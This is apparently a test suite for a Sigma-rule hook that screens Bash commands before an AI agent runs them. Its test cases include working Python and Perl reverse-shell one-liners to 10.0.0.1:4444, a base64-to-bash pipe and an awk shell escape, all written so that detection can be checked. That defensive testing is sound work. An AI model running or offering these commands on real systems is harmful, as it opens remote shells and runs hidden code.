#!/usr/bin/env python3
"""Test suite for sigma_engine.py hook.

Runs the repo copy of the hook as a subprocess. The match-expecting cases need
the compiled rule file that scripts/install.sh writes; when it is absent the
engine correctly no-ops, so those cases are skipped rather than failed while the
benign cases still assert zero false matches. A fresh checkout is therefore
green with or without rules.

The rule path is imported from the guard rather than restated here: it lives
outside the plugin (see sigma_engine.py) and a second copy of that path would be
free to drift from the one the hook actually reads.
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

import _isolated_home  # noqa: F401  MUST precede every hook import

HOOKS_DIR = Path(__file__).resolve().parent.parent / "hooks"
GUARD = str(HOOKS_DIR / "sigma_engine.py")

sys.path.insert(0, str(HOOKS_DIR))
from sigma_engine import RULES_PATH  # noqa: E402

# The compiled ruleset lives outside the repo under $HOME, which _isolated_home has
# just diverted -- without this the match-expecting cases would silently skip. The
# relative path is derived from RULES_PATH rather than restated, so it cannot drift
# from the one the hook actually reads.
_isolated_home.seed(RULES_PATH.relative_to(_isolated_home.HOME))

TEST_CASES = [
    # (name, command, should_match)
    ("benign ls", "ls -la", False),
    ("benign git", "git status", False),
    ("benign curl", "curl https://example.com", False),
    ("benign python", "python3 script.py", False),
    ("base64 pipe bash", "echo SGVsbG8= | base64 -d | bash", True),
    ("base64 pipe sh", "cat encoded.txt | base64 -d |sh", True),
    (
        "python revshell",
        'python3 -c "import socket,pty,os;s=socket.socket();'
        's.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);'
        'pty.spawn(\"/bin/sh\")"',
        True,
    ),
    ("python http.server", "python3 -m http.server 8080", True),
    (
        "awk shell",
        'awk \'BEGIN {system("/bin/sh")}\'',
        True,
    ),
    (
        "perl revshell",
        'perl -e \'use Socket;$i="10.0.0.1";'
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "connect(S,sockaddr_in(4444,inet_aton($i)));"
        'open(STDIN,">&S");exec("/bin/sh -i");\'',
        True,
    ),
    ("benign echo", "echo hello world", False),
    ("benign find", "find . -name '*.py'", False),
]


def run_guard(command):
    """Run sigma_engine.py with a test command and return the output."""
    test_input = {
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "hook_event_name": "PreToolUse",
    }
    result = subprocess.run(
        [sys.executable, GUARD],
        input=json.dumps(test_input),
        capture_output=True,
        text=True,
        timeout=5,
    )
    try:
        return json.loads(result.stdout) if result.stdout.strip() else {}
    except json.JSONDecodeError:
        return {}


def _reason(output):
    """Pull the human-readable reason from either hook response shape.

    An ``ask`` uses hookSpecificOutput.permissionDecisionReason; a
    config-downgraded ``warn`` uses systemMessage.
    """
    hso = output.get("hookSpecificOutput")
    if isinstance(hso, dict) and hso.get("permissionDecisionReason"):
        return hso["permissionDecisionReason"]
    return output.get("systemMessage", "")


def _synthetic_rule(name, level):
    """A minimal compiled rule that matches any command containing 'sigmaprobe'."""
    return {
        "id": "test-%s" % name,
        "title": "Synthetic %s" % name,
        "level": level,
        "description": "test fixture",
        "tags": [],
        "references": [],
        "condition_type": "single_selection",
        "condition_meta": {},
        "selections": {
            "selection": {
                "type": "and_fields",
                "entries": [{
                    "field": "CommandLine",
                    "modifier": "contains",
                    "values": ["sigmaprobe"],
                    "all": False,
                }],
            },
        },
        "filters": {},
    }


def run_with_rules(rules, command, severity_floor=None):
    """Run the guard against a synthetic ruleset in a throwaway HOME.

    The floor filter and the match-cap live inside main(), so nothing that
    imports the module can reach them -- and pointing the real compiled rules at
    an assertion would make the test depend on whichever SigmaHQ commit was
    pulled last. Both are driven here through the actual hook interface instead.
    """
    home = tempfile.mkdtemp(prefix="sigma-home-")
    try:
        sigma_dir = Path(home) / ".claude" / "forcefield" / "sigma"
        sigma_dir.mkdir(parents=True)
        (sigma_dir / "rules.json").write_text(
            json.dumps({"version": 1, "rules": rules}), encoding="utf-8")
        if severity_floor:
            (Path(home) / ".claude" / "forcefield.json").write_text(
                json.dumps({"guards": {"sigma_engine": {
                    "severity_floor": severity_floor}}}), encoding="utf-8")
        env = dict(os.environ, HOME=home)
        result = subprocess.run(
            [sys.executable, GUARD],
            input=json.dumps({"tool_name": "Bash",
                              "tool_input": {"command": command},
                              "hook_event_name": "PreToolUse"}),
            capture_output=True, text=True, timeout=30, env=env, cwd=home,
        )
        try:
            return json.loads(result.stdout) if result.stdout.strip() else {}
        except json.JSONDecodeError:
            return {}
    finally:
        shutil.rmtree(home, ignore_errors=True)


def check_mutation_gaps():
    """Assertions for the two sigma mutants that survived the suite.

    Both are in main() and both concern *which* rules are allowed to speak, so a
    test that only checks "something matched" passes under either.
    """
    failures = []

    # M29 -- the match loop breaks at three. Turning the break into a pass lets a
    # command that trips a dozen broad rules emit a dozen alerts, burying the
    # decision in noise. Assert the cap, not merely that a match happened.
    many = [_synthetic_rule("r%d" % i, "high") for i in range(8)]
    out = run_with_rules(many, "sigmaprobe --run")
    alerts = _reason(out).count("SECURITY ALERT:")
    if alerts != 3:
        failures.append("M29: expected exactly 3 alerts, got %d" % alerts)

    # M28 -- `if floor > 1` is what applies the floor at all. Raised past any
    # real rank the filter never runs, so a permissive config that asked for
    # high-only silently keeps firing on medium rules.
    mixed = [_synthetic_rule("med", "medium"), _synthetic_rule("hi", "high")]
    out = run_with_rules(mixed, "sigmaprobe --run", severity_floor="high")
    reason = _reason(out)
    if "Synthetic med" in reason:
        failures.append("M28: severity_floor=high still fired a medium rule")
    if "Synthetic hi" not in reason:
        failures.append("M28: severity_floor=high dropped the high rule too")

    # ...and with no floor configured, the medium rule must still fire, so the
    # assertion above cannot be satisfied by filtering everything.
    out = run_with_rules(mixed, "sigmaprobe --run")
    if "Synthetic med" not in _reason(out):
        failures.append("default floor must keep medium rules active")

    for line in failures:
        print("  FAIL  %s" % line)
    if not failures:
        print("  PASS  sigma match-cap and severity floor are enforced")
    return failures


def main():
    rules_present = RULES_PATH.exists()
    if not rules_present:
        print(
            "  NOTE: %s absent (run scripts/install.sh to compile rules);\n"
            "        engine no-ops without rules, so match-expecting cases "
            "are skipped.\n" % RULES_PATH
        )

    passed = 0
    failed = 0
    skipped = 0

    for name, cmd, should_match in TEST_CASES:
        if should_match and not rules_present:
            skipped += 1
            print(f"  SKIP [.....] {name:25s} (needs compiled rules)")
            continue

        output = run_guard(cmd)
        matched = bool(output)

        if matched == should_match:
            status = "PASS"
            passed += 1
        else:
            status = "FAIL"
            failed += 1

        indicator = "ALERT" if matched else "pass "
        expect = "expect-alert" if should_match else "expect-pass"

        if status == "FAIL":
            print(f"  {status} [{indicator}] {name:25s} ({expect})")
            if matched:
                print(f"        Got: {_reason(output)[:100]}")
        else:
            detail = ""
            if matched:
                title_line = _reason(output).split("\n")[0]
                detail = f" -> {title_line[:50]}"
            print(f"  {status} [{indicator}] {name:25s}{detail}")

    # Synthetic-rule cases: these drive their own ruleset in a throwaway HOME, so
    # unlike the cases above they run whether or not install.sh has been used.
    print("\n  Rule-selection invariants (synthetic rules):")
    gap_failures = check_mutation_gaps()
    failed += len(gap_failures)

    total = len(TEST_CASES)
    print(f"\n  Results: {passed} passed, {failed} failed, {skipped} skipped out of {total}")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
